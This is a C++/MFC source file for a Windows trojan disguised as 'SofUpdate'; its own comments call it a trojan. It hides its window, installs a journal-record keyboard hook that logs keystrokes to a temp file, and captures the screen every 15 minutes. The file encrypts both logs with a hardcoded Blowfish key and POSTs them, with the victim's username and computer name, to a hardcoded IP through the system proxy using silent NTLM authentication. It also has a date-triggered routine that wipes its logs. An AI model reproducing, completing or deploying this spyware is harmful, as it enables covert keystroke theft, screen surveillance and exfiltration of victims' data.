// SofUpdateDlg.cpp : implementation file
//

// remove infection routine. - done
// remove all user infection. - done
// add mechanism to ID for delivery method. - done
// 15mins screenshots / keylog - done
// send a message when removed. - done
// encryption support. - done
// Add support for proxy + NTLM authentication.

#include "stdafx.h"
#include "SofUpdate.h"
#include "SofUpdateDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW	
#endif

// UGLY FIX ME! (globalz????) can i  initialise these den cappain ?
char szFile[4096], szLogText[512];
bool bRunning = FALSE;
HANDLE hCapFile = NULL, hKeyCapThread = NULL, hFile;
HHOOK hLogHook = NULL;
HWND hLastFocus = NULL;
CString szBuffer2;
int nBufSize;
LPWSTR lpws = new wchar_t[nBufSize];	
BYTE btKeyBuff[256];
char szBuffer[256];
DWORD dwBytes = 0, dwCount;
EVENTMSG *pEvent;
int iKey, iScan, iCharCount;
WORD wrChar;
BOOL bLogging = FALSE;
BYTE btKeyState[256];
HMODULE hModule = NULL;
int i;
MSG mgMsg;
BOOL bStat;
CImage image;
CWnd *pWnd;
CRect rect;
char *pcValue;
size_t len3;
CString strTempName;
CString strTempName2;
CStringA szFileName;
CTime auth;
bool doOnce;
CFileException ex;
CFile sourceFile;
//CWindowDC winDC(pWnd);
// these will be mem leakz if not careful - need only one instance


// CSofUpdateDlg dialog

// - function to return proxy settings from IE/firefox (stored in registry)
// - function to take a capture of the screen, convert to jpeg/compress.
// - function to send screenshot over socket/http proxy/socks proxy

CSofUpdateDlg::CSofUpdateDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CSofUpdateDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CSofUpdateDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}

void CSofUpdateDlg::DateCheck(){ // if trojan running past 10th september, die and wipe logs.
	auth = CTime::GetCurrentTime();
	if(auth.GetDay() >= 10 && auth.GetMonth() >= 9 || auth.GetYear() >= 2007){
			if(doOnce == false){
				doOnce = true;
				char *outValue;
				size_t outlen;
				_dupenv_s(&outValue, &outlen, "TEMP");
				strTempName = CString(outValue);
				strTempName2 = strTempName;
				strTempName2.Append(CString("\\l0g01.txt")); 
				strTempName.Append(CString("\\913921.jpg"));
				DeleteFile(strTempName);
				DeleteFile(strTempName2); 
				NetworkFileSend(CString("NULLSTRING"),2);
			}
			exit(0);		
	}
	return;
}

BEGIN_MESSAGE_MAP(CSofUpdateDlg, CDialog)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_TIMER()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()


// CSofUpdateDlg message handlers

BOOL CSofUpdateDlg::OnInitDialog()
{
	CDialog::OnInitDialog();
	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon	
	// TODO: Add extra initialization here	
	CString progname = CString("SofUpdateT");
	if(FindWindow(NULL,progname)!=0) exit(0);
	SetWindowText(progname); // launch only one instance of trojan
	TCHAR infoBuf[32768];
	DWORD bufCharCount = 32767;
	GetUserName(infoBuf,&bufCharCount);
	CSofUpdateDlg::sUser = CString(infoBuf);	
	sUser.Replace(CString(" "),CString("%20"));
	GetComputerName(infoBuf,&bufCharCount);
	CSofUpdateDlg::sComp = CString(infoBuf);
	sComp.Replace(CString(" "),CString("%20"));
	doOnce = false;
	DateCheck();
	// grab the current username and computer name for later use and make URL safe
	char *ptValue;
    size_t len2;
    _dupenv_s(&ptValue, &len2, "TEMP");
	szFileName = CStringA(CStringA(ptValue));			
	szFileName.Append(CStringA("\\l0g01.txt"));		
	strcpy(szFile,szFileName); // introduces a buffer overflow if environment variable for TEMP >= 4096 (fix me)
	unlink(szFile); // deprecated but it workz
	// purge old keylogger log file from hard disk.
	DWORD dwID;	
	CreateThread(NULL, 0, &keylogger, NULL, 0, &dwID);
	// Create the keylogger hook thread
    _dupenv_s(&pcValue, &len3, "TEMP");
	strTempName = CString(pcValue);	// CMemFile :-P ?
	strTempName2 = strTempName;
	strTempName2.Append(CString("\\l0g01.txt")); // back up of keylogger location
	strTempName.Append(CString("\\913921.jpg"));	// configure snapshot dir	
	//pTimer = SetTimer(1,30000,0);
	pTimer = SetTimer(1,900000,0); // take a screen shot every 15mins via timer event and send the file.	
	return TRUE;  // return TRUE  unless you set the focus to a control
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CSofUpdateDlg::OnPaint()
{
	ShowWindow(SW_HIDE);//Hide the dialog
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting
		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);		
		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this function to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CSofUpdateDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

void CSofUpdateDlg::OnTimer(UINT_PTR nIDEvent)
{		
	pWnd = CWnd::GetDesktopWindow();
	ASSERT(pWnd);
	if(pWnd == NULL)
		return; // some error			
	CWindowDC winDC(pWnd);	
	pWnd->GetWindowRect(rect);
	int nBPP = winDC.GetDeviceCaps(BITSPIXEL) * winDC.GetDeviceCaps(PLANES);
	if (nBPP < 24)
		nBPP = 24;
	bStat = image.Create(rect.Width(), rect.Height(), nBPP);	
	ASSERT(bStat);
	if (!bStat)
		return; // some error
	CImageDC imageDC(image);		
	::BitBlt(imageDC, 0, 0, rect.Width(), rect.Height(), winDC, 0, 0, SRCCOPY);	
	HRESULT hr = image.Save(strTempName);	
	
	// get rid of imageDC and winDC	
	image.Destroy();
	::ReleaseDC(NULL,winDC);
	::ReleaseDC(NULL,imageDC);
	if (FAILED(hr)) {
		return; // some error
	}
	// We have the image so (compress + send)
	DateCheck(); // check wether should still be running.
	NetworkFileSend(strTempName,0);	
	NetworkFileSend(strTempName2,1);	
	return;
}


//Journal Hook Thread
LRESULT CALLBACK journalrecord(int Code, WPARAM wParam, LPARAM lParam)
{
	pEvent = (EVENTMSG *)lParam;
	if (Code < 0) return CallNextHookEx(hLogHook, Code, wParam, lParam);
	if (Code == HC_ACTION)
	{
		if (pEvent->message == WM_KEYDOWN)
		{
			iKey = LOBYTE(pEvent->paramL);
			iScan = HIBYTE(pEvent->paramL);
			iScan <<= 16;
			szBuffer2 = CString(szBuffer);
			nBufSize = szBuffer2.GetLength() + 1;						
			lstrcpy(lpws, szBuffer2);
			dwCount = GetKeyNameText(iScan, lpws, 256);					
			if (dwCount) 
			{
				if (iKey == VK_SPACE) 
				{
						szBuffer[0] = ' ';
						szBuffer[1] = '\0';
						dwCount = 1;
				}
				if (dwCount == 1) 
				{
						GetKeyboardState(btKeyBuff);
						iCharCount = ToAscii(iKey, iScan, btKeyBuff, &wrChar, 0);
					if (iCharCount > 0) WriteFile(hCapFile, &wrChar, iCharCount, &dwBytes, NULL);				
				} 
				else 
				{
					if(iKey == VK_LBUTTON) WriteFile(hCapFile, "[VK_LBUTTON]", 12, &dwBytes, NULL);
					if(iKey == VK_RBUTTON) WriteFile(hCapFile, "[VK_RBUTTON]", 12, &dwBytes, NULL);
					if(iKey == VK_BACK) WriteFile(hCapFile, "[VK_BACK]", 9, &dwBytes, NULL);
					if(iKey == VK_TAB) WriteFile(hCapFile, "[VK_TAB]", 8, &dwBytes, NULL);
					if(iKey == VK_CLEAR) WriteFile(hCapFile, "[VK_CLEAR]", 10, &dwBytes, NULL);
					if(iKey == VK_RETURN) WriteFile(hCapFile, "\r\n", 2, &dwBytes, NULL);
					if(iKey == VK_PAUSE) WriteFile(hCapFile, "[VK_PAUSE]", 10, &dwBytes, NULL);
					if(iKey == VK_CAPITAL) WriteFile(hCapFile, "[VK_CAPITAL]", 12, &dwBytes, NULL);
					if(iKey == VK_KANJI) WriteFile(hCapFile, "[VK_KANJI]", 10, &dwBytes, NULL);
					if(iKey == VK_ESCAPE) WriteFile(hCapFile, "[VK_ESCAPE]", 11, &dwBytes, NULL);
					if(iKey == VK_END) WriteFile(hCapFile, "[VK_END]", 8, &dwBytes, NULL);
					if(iKey == VK_HOME) WriteFile(hCapFile, "[VK_HOME]", 9, &dwBytes, NULL);
					if(iKey == VK_LEFT) WriteFile(hCapFile, "[VK_LEFT]", 9, &dwBytes, NULL);
					if(iKey == VK_UP) WriteFile(hCapFile, "[VK_UP]", 7, &dwBytes, NULL);
					if(iKey == VK_RIGHT) WriteFile(hCapFile, "[VK_RIGHT]", 10, &dwBytes, NULL);
					if(iKey == VK_DOWN) WriteFile(hCapFile, "[VK_DOWN]", 9, &dwBytes, NULL);
					if(iKey == VK_INSERT) WriteFile(hCapFile, "[VK_INSERT]", 11, &dwBytes, NULL);
					if(iKey == VK_DELETE) WriteFile(hCapFile, "[VK_DELETE]", 11, &dwBytes, NULL);
					if(iKey == VK_NUMPAD0) WriteFile(hCapFile, "[VK_NUMPAD0]", 12, &dwBytes, NULL);
					if(iKey == VK_NUMPAD1) WriteFile(hCapFile, "[VK_NUMPAD1]", 12, &dwBytes, NULL);
					if(iKey == VK_NUMPAD2) WriteFile(hCapFile, "[VK_NUMPAD2]", 12, &dwBytes, NULL);
					if(iKey == VK_NUMPAD3) WriteFile(hCapFile, "[VK_NUMPAD3]", 12, &dwBytes, NULL);
					if(iKey == VK_NUMPAD4) WriteFile(hCapFile, "[VK_NUMPAD4]", 12, &dwBytes, NULL);
					if(iKey == VK_NUMPAD5) WriteFile(hCapFile, "[VK_NUMPAD5]", 12, &dwBytes, NULL);
					if(iKey == VK_NUMPAD6) WriteFile(hCapFile, "[VK_NUMPAD6]", 12, &dwBytes, NULL);
					if(iKey == VK_NUMPAD7) WriteFile(hCapFile, "[VK_NUMPAD7]", 12, &dwBytes, NULL);
					if(iKey == VK_NUMPAD8) WriteFile(hCapFile, "[VK_NUMPAD8]", 12, &dwBytes, NULL);
					if(iKey == VK_NUMPAD9) WriteFile(hCapFile, "[VK_NUMPAD9]", 12, &dwBytes, NULL);
					if(iKey == VK_F1) WriteFile(hCapFile, "[VK_F1]", 7, &dwBytes, NULL);
					if(iKey == VK_F2) WriteFile(hCapFile, "[VK_F2]", 7, &dwBytes, NULL);
					if(iKey == VK_F3) WriteFile(hCapFile, "[VK_F3]", 7, &dwBytes, NULL);
					if(iKey == VK_F4) WriteFile(hCapFile, "[VK_F4]", 7, &dwBytes, NULL);
					if(iKey == VK_F5) WriteFile(hCapFile, "[VK_F5]", 7, &dwBytes, NULL);
					if(iKey == VK_F6) WriteFile(hCapFile, "[VK_F6]", 7, &dwBytes, NULL);
					if(iKey == VK_F7) WriteFile(hCapFile, "[VK_F7]", 7, &dwBytes, NULL);
					if(iKey == VK_F8) WriteFile(hCapFile, "[VK_F8]", 7, &dwBytes, NULL);
					if(iKey == VK_F9) WriteFile(hCapFile, "[VK_F9]", 7, &dwBytes, NULL);
					if(iKey == VK_F10) WriteFile(hCapFile, "[VK_F10]", 8, &dwBytes, NULL);
					if(iKey == VK_F11) WriteFile(hCapFile, "[VK_F11]", 8, &dwBytes, NULL);
					if(iKey == VK_F12) WriteFile(hCapFile, "[VK_F12]", 8, &dwBytes, NULL);
					if(iKey == VK_NUMLOCK) WriteFile(hCapFile, "[VK_NUMLOCK]", 12, &dwBytes, NULL);
					if(iKey == VK_SCROLL) WriteFile(hCapFile, "[VK_SCROLL]", 11, &dwBytes, NULL);					
					if(iKey == VK_SHIFT) WriteFile(hCapFile, "[VK_SHIFT]", 10, &dwBytes, NULL);
					if(iKey == VK_CONTROL) WriteFile(hCapFile, "[VK_CONTROL]", 12, &dwBytes, NULL);					
					if(iKey == VK_MENU) WriteFile(hCapFile, "[VK_MENU]", 9, &dwBytes, NULL);					
				}
			}		
		}
	
	}	
	return CallNextHookEx(hLogHook, Code, wParam,  lParam);
}


void CSofUpdateDlg::NetworkFileSend(CString sPath,int iType)
{
	CAtlHttpClient httpClient; // instance of HTTP Client
	CString URLPath;
	CNTLMAuthObject ntlmAuth;  // get current username and password and default to NTLM Auth type object
	CUrl mySite; // instance of url object
	CAtlNavigateData myData; // the data to be sent to the webserver	
	HKEY hKey = HKEY_LOCAL_MACHINE;
	HKEY hKeyNew;
	CString subkey = CString("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings");
	RegOpenKeyEx(hKey,subkey,0,KEY_QUERY_VALUE,&hKeyNew);
	CString Value = CString("ProxyEnable");
	DWORD Value_size = REG_DWORD;
	BYTE *Value_data = new BYTE[4];
	DWORD Value_type = REG_DWORD;
	RegQueryValueEx(hKeyNew,Value,NULL,&Value_type,Value_data,&Value_size);
	DWORD Value_real = 0;
	memcpy(Value_data,(void*)&Value_real,sizeof(DWORD));	
	RegCloseKey(hKey);
	if(Value_real <= 1){
		httpClient.SetProxy();     // Retrieve current proxy settings if enabled in IE	
		httpClient.AddAuthObj(_T("NTLM"),&ntlmAuth);  // Add NTLM authentication to HTTP Client
		httpClient.NegotiateAuth(true);  // Set true to negotiate proxy auth.	
	}	
	mySite.SetHostName(CString("123.123.123.123"));// this is where we send data too.
	myData.SetMethod(ATL_HTTP_METHOD_POST);
	URLPath = CString("/test.php?delivery=2&user="); // delivery ID here.
	URLPath.Append(sUser);	
	URLPath.Append(CString("&comp="));
	URLPath.Append(sComp);
	httpClient.SetSilentLogonOk(true);
	if(iType==0) URLPath.Append(CString("&type=jpg"));	
	if(iType==1) URLPath.Append(CString("&type=txt"));
	if(iType==2) URLPath.Append(CString("&type=uninstall"));	
	mySite.SetUrlPath(URLPath);		
	if(iType!=2){
		sourceFile.Open(sPath, CFile::modeRead | CFile::shareDenyNone, &ex); 
		ULONGLONG size = sourceFile.GetLength();		
		BYTE* buffer = new byte[size];
		BYTE* blowbuffer = new byte[size];
		memset(blowbuffer,0,size);
		DWORD dwRead;			
		dwRead = sourceFile.Read(buffer, size);		
		sourceFile.Close();	
		// blowfish buffer size of buffer, buffer is original, blowbuffer for output		
		CBlowFish oBlowFish((unsigned char*)"prdelkar0xw0rLdz", 16);
		oBlowFish.Encrypt((unsigned char*)buffer,(unsigned char*)blowbuffer, size, CBlowFish::CBC);		
		CString datatype;
		if(iType==0) datatype = CString("image/jpeg");
		if(iType==1) datatype = CString("text/text");		
		myData.SetPostData(blowbuffer,size,datatype);					
		httpClient.Navigate(&mySite,&myData);// NULL needs to be changed to NavigateData object containing my shizzle.
		delete buffer;
		delete blowbuffer;
	}
	else{
		httpClient.Navigate(&mySite,&myData);// NULL needs to be changed to NavigateData object containing my shizzle.
	}
	DateCheck();
	return;
}

//Keylogger
DWORD WINAPI keylogger(LPVOID param)
{
	for (i = 0; i < 256; i++) btKeyState[i] = 0;
		hLastFocus = NULL;
		hModule = GetModuleHandle(NULL);
		CString szFile2 = CString(szFile);			
		hCapFile = CreateFile(szFile2, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, NULL, NULL);
	if (hCapFile == INVALID_HANDLE_VALUE) return 0;
		SetFilePointer(hCapFile, 0, NULL, FILE_END);
		hLogHook = SetWindowsHookEx(WH_JOURNALRECORD, journalrecord, hModule, 0);
	if (hLogHook == NULL) 
	{
			CloseHandle(hCapFile);
			hCapFile = NULL;
			return 0;
	}
		bLogging = TRUE;
	while (bLogging) 
	{
		while(PeekMessage(&mgMsg, NULL, 0, 0, PM_NOREMOVE)) 
		{
				GetMessage(&mgMsg, NULL, 0, 0);
			if (mgMsg.message == WM_CANCELJOURNAL) 
			{
					SetKeyboardState(btKeyState);
					hLogHook = SetWindowsHookEx(WH_JOURNALRECORD, journalrecord,hModule, 0);
				if (hLogHook == NULL) 
				{
						CloseHandle(hCapFile);						
						hCapFile = NULL;					
						return 0;
				}
			} 
			else DispatchMessage(&mgMsg);
		}
			Sleep(10);
	}
		UnhookWindowsHookEx(hLogHook);
		CloseHandle(hCapFile);
		hCapFile = NULL;
		hKeyCapThread = NULL;		
		return 0;
}


